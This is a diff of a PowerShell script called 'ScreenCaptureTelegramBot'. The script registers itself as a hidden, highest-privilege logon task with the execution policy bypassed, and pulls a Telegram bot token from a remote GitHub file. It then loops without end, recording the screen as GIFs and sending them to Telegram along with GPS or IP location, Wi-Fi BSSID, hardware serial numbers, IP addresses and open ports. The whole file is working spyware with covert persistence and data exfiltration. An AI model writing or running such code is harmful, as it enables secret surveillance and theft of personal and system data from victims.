@@ -1,64 +1,56 @@
 param(
     [switch]$background
 )
-
-# ====================================================
-# If not in background mode, install the scheduled task and exit
-# ====================================================
+# -------------------------------
+# If not running in background mode, register a scheduled task and exit
+# -------------------------------
 if (-not $background) {
     $taskName = "ScreenCaptureTelegramBot"
-    try {
-        $scriptPath = (Resolve-Path $MyInvocation.MyCommand.Definition).Path
-    } catch {
-        Write-Error "Unable to resolve script path. Exiting."
-        exit
+    # Determine the full path of the script
+    if ($PSCommandPath) {
+        $scriptPath = $PSCommandPath
     }
-    $taskCommand = "PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
-    Write-Output "Installing scheduled task '$taskName'..."
-    schtasks.exe /delete /tn $taskName /f | Out-Null
-    $createTaskOutput = schtasks.exe /create /tn $taskName /tr $taskCommand /sc onlogon /rl HIGHEST /f
-    if ($LASTEXITCODE -eq 0) {
-        Write-Output "Scheduled task '$taskName' installed successfully."
-        schtasks.exe /run /tn $taskName | Out-Null
-    } else {
-        Write-Error "Failed to install scheduled task. Output: $createTaskOutput"
+    else {
+        $scriptPath = $MyInvocation.MyCommand.Definition
     }
-    exit
-}
-
-# ====================================================
-# Background Mode: Main Functionality
-# ====================================================
-Write-Output "Running in background mode. Starting main loop..."
-
-# Ensure temporary folder exists
-if (-not (Test-Path "C:\\Temp")) {
+    # Create the scheduled task using PowerShell-native commands
     try {
-        New-Item -ItemType Directory -Path "C:\\Temp" | Out-Null
-    } catch {
-        Write-Error "Cannot create C:\\Temp folder. Exiting."
+        $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
+            -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
+        Write-Output "Scheduled task '$taskName' registered successfully."
+        # Optionally, start the task immediately
+        Start-ScheduledTask -TaskName $taskName
+    }
+    catch {
+        Write-Error "Failed to register scheduled task: $_"
         exit
     }
 }
-
-# Enable DPI Awareness (for high DPI screens)
+# ===============================
+# Enable DPI Awareness to capture full resolution on high DPI screens
+# ===============================
 Add-Type -MemberDefinition @"
     [DllImport("user32.dll")]
     public static extern bool SetProcessDPIAware();
 "@ -Name NativeMethods -Namespace MyNamespace
 [MyNamespace.NativeMethods]::SetProcessDPIAware() | Out-Null
-
-# Retrieve Credentials from Remote Source
+# Adjust process priority to reduce resource usage
+(Get-Process -Id $PID).PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
+# ===============================
+# Configuration & Credentials from Remote Source
+# ===============================
 $credUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
 try {
-    $CredJson = (Invoke-WebRequest -Uri $credUrl -UseBasicParsing -ErrorAction Stop).Content
+    $CredJson = (Invoke-WebRequest -Uri $credUrl -UseBasicParsing).Content
     $Cred = $CredJson | ConvertFrom-Json
-} catch {
-    Write-Error "Failed to retrieve credentials: $_"
+}
+catch {
+    Write-Error "Failed to retrieve credentials from remote URL: $_"
     exit
 }
-
-# Function: Decrypt-Credential (returns plain text if not encrypted)
 function Decrypt-Credential {
     param ([string]$EncryptedString)
     if ($EncryptedString -match '^01000000') {
@@ -68,20 +60,24 @@ function Decrypt-Credential {
             $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
             [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
             return $plain
-        } catch {
+        }
+        catch {
             return $EncryptedString
         }
-    } else {
+    }
+    else {
         return $EncryptedString
     }
 }
-
 $BotToken = Decrypt-Credential -EncryptedString $Cred.BotToken
-$ChatID = Decrypt-Credential -EncryptedString $Cred.ChatID
-
-# Function: Capture-Frame (screenshot as a BitmapSource)
+$ChatID   = Decrypt-Credential -EncryptedString $Cred.ChatID
+# ===============================
+# Function: Capture a single screenshot frame as a BitmapSource
+# ===============================
 function Capture-Frame {
-    Add-Type -AssemblyName System.Windows.Forms, System.Drawing, PresentationCore
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    Add-Type -AssemblyName PresentationCore
     $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
     $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
     $graphics = [System.Drawing.Graphics]::FromImage($bmp)
@@ -94,16 +90,20 @@ function Capture-Frame {
         [System.Windows.Int32Rect]::new(0, 0, $bmp.Width, $bmp.Height),
         [System.Windows.Media.Imaging.BitmapSizeOptions]::FromEmptyOptions()
     )
+    # Release GDI handle and dispose of resources
     Add-Type -MemberDefinition @"
         [DllImport("gdi32.dll")]
         public static extern bool DeleteObject(IntPtr hObject);
-    "@ -Name GDI32 -Namespace Win32
+"@ -Name GDI32 -Namespace Win32
     [Win32.GDI32]::DeleteObject($hBitmap) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::Release($hBitmap) | Out-Null
     $bmp.Dispose()
+    [System.GC]::Collect()
     return $bitmapSource
 }
-
-# Function: Capture-AnimatedGIF (captures a screen GIF)
+# ===============================
+# Function: Capture an Animated GIF of the Screen over a Given Duration
+# ===============================
 function Capture-AnimatedGIF {
     param(
         [int]$durationSeconds = 10,
@@ -113,19 +113,30 @@ function Capture-AnimatedGIF {
     $encoder = New-Object System.Windows.Media.Imaging.GifBitmapEncoder
     $totalFrames = [Math]::Ceiling($durationSeconds * $framesPerSecond)
     $frameInterval = 1 / $framesPerSecond
-    for ($i = 0; $i -lt $totalFrames; $i++) {
-        $frame = Capture-Frame
-        $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
-        Start-Sleep -Seconds $frameInterval
+    try {
+        for ($i = 0; $i -lt $totalFrames; $i++) {
+            $frame = Capture-Frame
+            $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
+            Start-Sleep -Milliseconds ([Math]::Ceiling($frameInterval * 1000))
+        }
+        $gifPath = "C:\Temp\screenrecord.gif"
+        if (-not (Test-Path "C:\Temp")) {
+            New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null
+        }
+        $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
+        $encoder.Save($fs)
+        $fs.Close()
+        return $gifPath
     }
-    $gifPath = "C:\\Temp\\screenrecord.gif"
-    $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
-    $encoder.Save($fs)
-    $fs.Close()
-    return $gifPath
+    catch {
+        Write-Error "GIF capture failed: $_"
+        Send-TelegramMessage -Message "🚨 GIF capture failed: $($_.Exception.Message)"
+        return $null
+    }
 }
-
-# Function: Send-TelegramAnimation (sends the GIF via Telegram API)
+# ===============================
+# Function: Send an Animation (GIF) to the Telegram Bot
+# ===============================
 function Send-TelegramAnimation {
     param (
         [string]$GifPath
@@ -133,45 +144,47 @@ function Send-TelegramAnimation {
     $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
     $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
     $LF = "`r`n"
-    $ms = New-Object System.IO.MemoryStream
-    $chatIdHeader = "--$Boundary$LF" +
-        'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
-        $ChatID + $LF
-    $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
-    $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
-    $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
-    $fileHeader = "--$Boundary$LF" +
-        'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
-        "Content-Type: image/gif$LF$LF"
-    $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
-    $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
-    $ms.Write($fileBytes, 0, $fileBytes.Length)
-    $ending = "$LF--$Boundary--$LF"
-    $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
-    $ms.Write($endingBytes, 0, $endingBytes.Length)
-    $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
-    $ContentBytes = $ms.ToArray()
-    $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
-    $WebRequest.Method = "POST"
-    $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
-    $WebRequest.ContentLength = $ContentBytes.Length
-    $Stream = $WebRequest.GetRequestStream()
-    $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
-    $Stream.Close()
     try {
+        $ms = New-Object System.IO.MemoryStream
+        # Add chat ID header
+        $chatIdHeader = "--$Boundary$LF" +
+                        'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
+                        $ChatID + $LF
+        $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
+        $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
+        # Add file content
+        $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
+        $fileHeader = "--$Boundary$LF" +
+                      'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
+                      "Content-Type: image/gif$LF$LF"
+        $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
+        $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
+        $ms.Write($fileBytes, 0, $fileBytes.Length)
+        # Add ending boundary
+        $ending = "$LF--$Boundary--$LF"
+        $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
+        $ms.Write($endingBytes, 0, $endingBytes.Length)
+        $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+        $ContentBytes = $ms.ToArray()
+        # Send request
+        $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
+        $WebRequest.Method = "POST"
+        $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
+        $WebRequest.ContentLength = $ContentBytes.Length
+        $WebRequest.Timeout = 30000  # 30 seconds
+        $Stream = $WebRequest.GetRequestStream()
+        $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
+        $Stream.Close()
         $Response = $WebRequest.GetResponse()
-        $ResponseStream = $Response.GetResponseStream()
-        $Reader = New-Object System.IO.StreamReader($ResponseStream)
-        $null = $Reader.ReadToEnd() | Out-Null
-        $Reader.Close()
-        $ResponseStream.Close()
         $Response.Close()
-    } catch {
-        Write-Error "Error sending Telegram animation: $_"
+    }
+    catch {
+        Write-Error "Failed to send GIF: $_"
     }
 }
-
-# Function: Send-TelegramMessage (sends a text message)
+# ===============================
+# Function: Send a Text Message to the Telegram Bot
+# ===============================
 function Send-TelegramMessage {
     param (
         [string]$Message
@@ -179,16 +192,18 @@ function Send-TelegramMessage {
     $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
     $Body = @{
         chat_id = $ChatID
-        text = $Message
+        text    = $Message
     }
     try {
         Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json) | Out-Null
-    } catch {
-        Write-Error "Error sending Telegram message: $_"
+    }
+    catch {
+        Write-Error "Failed to send message: $_"
     }
 }
-
-# Function: Get-WindowsGeolocation (retrieves GPS info)
+# ===============================
+# Function: Get Native GPS Location using Windows Location Services
+# ===============================
 Add-Type -AssemblyName System.Device
 function Get-WindowsGeolocation {
     $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
@@ -201,8 +216,137 @@ function Get-WindowsGeolocation {
     if ($watcher.Position.Location.IsUnknown) {
         return $null
     }
-    return @{
-        Latitude = $watcher.Position.Location.Latitude
-        Longitude = $watcher.Position.Location.Longitude
-        Accuracy = $watcher
-
+    return @(
+        @{
+            Latitude  = $watcher.Position.Location.Latitude
+            Longitude = $watcher.Position.Location.Longitude
+            Accuracy  = $watcher.Position.Location.HorizontalAccuracy
+        }
+    )
+}
+# ===============================
+# Function: Get Complete System & Network Information
+# ===============================
+function Get-CompleteSystemInfo {
+    $computerName = $env:COMPUTERNAME
+    $osInstance = Get-CimInstance Win32_OperatingSystem
+    $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
+    $dateTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    $basicInfo = "=== Basic System Information ===`n" +
+                 "Computer Name: $computerName`n" +
+                 "OS: $osInfo`n" +
+                 "Date/Time: $dateTime`n"
+    try {
+        $wifiOutput = netsh wlan show interfaces | Out-String
+        $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
+        $signal = ($wifiOutput | Select-String "^\s*Signal\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
+        if (-not $ssid) { $ssid = "N/A" }
+        if (-not $signal) { $signal = "N/A" }
+    }
+    catch {
+        $ssid = "N/A"
+        $signal = "N/A"
+    }
+    $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"
+    $geo = Get-WindowsGeolocation
+    if ($geo) {
+        $locationInfo = "Latitude: $($geo.Latitude), Longitude: $($geo.Longitude) (Accuracy: $($geo.Accuracy) m)"
+    }
+    else {
+        try {
+            $ipGeo = Invoke-RestMethod "https://ipinfo.io/json" -UseBasicParsing
+            $locationInfo = "Approximate Location via IP: $($ipGeo.city), $($ipGeo.region) ($($ipGeo.loc))"
+        }
+        catch {
+            $locationInfo = "Location unavailable."
+        }
+    }
+    $locationSection = "GPS Location: $locationInfo`n"
+    $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
+    $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
+    $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
+    $enclosure = Get-CimInstance -ClassName Win32_SystemEnclosure | Select-Object SerialNumber, ChassisTypes
+    $systemInfoSection = "=== Detailed System Information ===`n" +
+                         "Manufacturer: $($cs.Manufacturer)`n" +
+                         "Model: $($cs.Model)`n" +
+                         "MTM: $($csp.Name)`n"
+    if ($csp.Version) {
+        $systemInfoSection += "Product Version: $($csp.Version)`n"
+    }
+    $biosSection = "`nBIOS Information:`n" +
+                   "  Serial Number: $($bios.SerialNumber)`n" +
+                   "  BIOS Version: $($bios.Version)`n" +
+                   "  Release Date: $($bios.ReleaseDate)`n"
+    $enclosureSection = "`nSystem Enclosure:`n" +
+                        "  Serial Number: $($enclosure.SerialNumber)`n" +
+                        "  Chassis Type: $($enclosure.ChassisTypes)`n"
+    $productSection = "`nProduct Information:`n" +
+                      "  SN: $($csp.IdentifyingNumber)`n" +
+                      "  UUID: $($csp.UUID)`n" +
+                      "  Vendor: $($csp.Vendor)`n"
+    $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
+                   Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
+                   Select-Object InterfaceAlias, IPAddress, PrefixLength
+    $ipInfo = "`n=== Network Information ===`nIP Addresses:`n"
+    foreach ($ip in $ipAddresses) {
+        $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress)/$($ip.PrefixLength)`n"
+    }
+    try {
+        $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
+        if ($wifiAdapter) {
+            $wifiDetails = netsh wlan show interfaces | Out-String
+            $bssid = ($wifiDetails | Select-String 'BSSID').Line -replace '.*BSSID\s*:\s*',''
+            $essid = ($wifiDetails | Select-String 'SSID').Line.Split(':')[1].Trim()
+            $wifiSection = "`nWiFi Details:`nESSID: $essid`nBSSID: $bssid`n"
+        }
+        else {
+            $wifiSection = "`nNo active WiFi interface found.`n"
+        }
+    }
+    catch {
+        $wifiSection = "`nError retrieving WiFi details.`n"
+    }
+    try {
+        $listeningPorts = Get-NetTCPConnection -State Listen | 
+                          Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
+                          Select-Object LocalAddress, LocalPort, 
+                              @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}}, 
+                              OwningProcess
+        $portsSection = "`nOpen Ports:`n"
+        foreach ($port in $listeningPorts) {
+            $portsSection += "IP: $($port.LocalAddress) Port: $($port.LocalPort) Process: $($port.Process)`n"
+        }
+    }
+    catch {
+        $portsSection = "`nError retrieving open ports.`n"
+    }
+    $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
+    $adaptersSection = "`nNetwork Adapters:`n"
+    foreach ($adapter in $adapters) {
+        $adaptersSection += "Name: $($adapter.Name) - $($adapter.InterfaceDescription) - Speed: $($adapter.LinkSpeed)`n"
+    }
+    $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
+    $gatewaySection = "`nDefault Gateway:`n"
+    foreach ($route in $defaultGateway) {
+        $gatewaySection += "NextHop: $($route.NextHop) via $($route.InterfaceAlias)`n"
+    }
+    return $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
+}
+# ===============================
+# Main Loop: Capture & Send a 10-Second Screen Recording (as Animated GIF)
+# and send complete system information
+# ===============================
+while ($true) {
+    try {
+        $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
+        if ($gifPath) {
+            Send-TelegramAnimation -GifPath $gifPath
+        }
+        $systemInfo = Get-CompleteSystemInfo
+        Send-TelegramMessage -Message $systemInfo
+    }
+    catch {
+        Send-TelegramMessage -Message "🚨 Error occurred: $($_.Exception.Message)"
+    }
+    Start-Sleep -Seconds 2
+}
